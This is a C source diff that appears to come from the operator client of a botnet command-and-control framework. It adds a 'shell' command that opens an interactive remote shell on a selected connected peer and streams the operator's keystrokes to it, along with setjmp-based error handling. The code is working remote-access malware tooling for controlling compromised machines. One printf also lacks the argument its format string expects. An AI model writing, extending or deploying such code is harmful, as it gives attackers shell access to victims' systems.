@@ -1,8 +1,35 @@
+#include <setjmp.h>
+
 #include "lmem.h"
 #include "sclient.h"
 #include "speer.h"
 #include "scmd.h"
 #include "sterm.h"
+#include "lerror.h"
+
+#define CMD_ERROR(...) do { \
+    shellT_printf("[ERROR] : " __VA_ARGS__); \
+    longjmp(cmdE_err, 1); \
+} while(0);
+
+jmp_buf cmdE_err;
+
+/* ===========================================[[ Helper Functions ]]============================================= */
+
+tShell_cmdDef *shellS_findCmd(char *cmd);
+
+tShell_peer *shellS_getPeer(tShell_client *client, int id) {
+    if (id >= client->peerTblCount)
+        CMD_ERROR("Not a valid peer ID! [%d]\n", id);
+    
+    return client->peerTbl[id];
+}
+
+int shellS_readInt(char *str) {
+    return atoi(str);
+}
+
+/* ===========================================[[ Command Handlers ]]============================================= */
 
 void helpCMD(tShell_client *client, int args, char *argc[]);
 
@@ -19,24 +46,50 @@ void listPeers(tShell_client *client, int args, char *argc[]) {
     shellT_printf("\n");
 }
 
+void openShell(tShell_client *client, int args, char *argc[]) {
+    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    tShell_peer *peer;
+    int id, sz;
+
+    if (args < 2)
+        CMD_ERROR("Usage: shell [PEER_ID]\n");
+
+    id = shellS_readInt(argc[1]);
+    peer = shellS_getPeer(client, id);
+
+    shellT_printf("\n\nOpening shell on peer %04d...\n\n");
+
+    /* open shell on peer */
+    shellC_openShell(client, peer);
+
+    /* while client is alive, and our shell is open */
+    while (laikaS_isAlive((&client->peer->sock)) && client->openShell) {
+        /* poll for 50ms */
+        if (!shellC_poll(client, 50)) {
+            /* check if we have input! */
+            if (shellT_waitForInput(0)) {
+                /* we have input! send SHELL_DATA packet */
+                sz = shellT_readRawInput(buf, sizeof(buf));
+                if (sz <= 0) /* sanity check */
+                    break;
+
+                shellC_sendDataShell(client, buf, sz);
+            }
+        }
+    }
+}
+
+/* =============================================[[ Command Table ]]============================================== */
+
 #define CREATECMD(_cmd, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .help = _help, .callback = _callback})
 
 tShell_cmdDef shellS_cmds[] = {
     CREATECMD("help", "Lists avaliable commands", helpCMD),
     CREATECMD("list", "Lists all connected peers to CNC", listPeers),
+    CREATECMD("shell", "Opens a shell on peer", openShell),
 };
 
 #undef CREATECMD
-
-void helpCMD(tShell_client *client, int args, char *argc[]) {
-    int i;
-
-    shellT_printf("\n\n=== [[ Command List ]] ===\n\n");
-    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
-        shellT_printf("%04d '%s'\t- %s\n", i, shellS_cmds[i].cmd, shellS_cmds[i].help);
-    }
-    shellT_printf("\n");
-}
 
 tShell_cmdDef *shellS_findCmd(char *cmd) {
     int i;
@@ -48,6 +101,16 @@ tShell_cmdDef *shellS_findCmd(char *cmd) {
     }
 
     return NULL;
+}
+
+void helpCMD(tShell_client *client, int args, char *argc[]) {
+    int i;
+
+    shellT_printf("\n\n=== [[ Command List ]] ===\n\n");
+    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
+        shellT_printf("%04d '%s'\t- %s\n", i, shellS_cmds[i].cmd, shellS_cmds[i].help);
+    }
+    shellT_printf("\n");
 }
 
 void shellS_initCmds(void) {
@@ -92,7 +155,9 @@ void shellS_runCmd(tShell_client *client, char *cmd) {
     }
 
     /* run command */
-    cmdDef->callback(client, args, argc);
+    if (setjmp(cmdE_err) == 0) {
+        cmdDef->callback(client, args, argc);
+    }
 
     /* free our argument buffer */
     laikaM_free(argc);
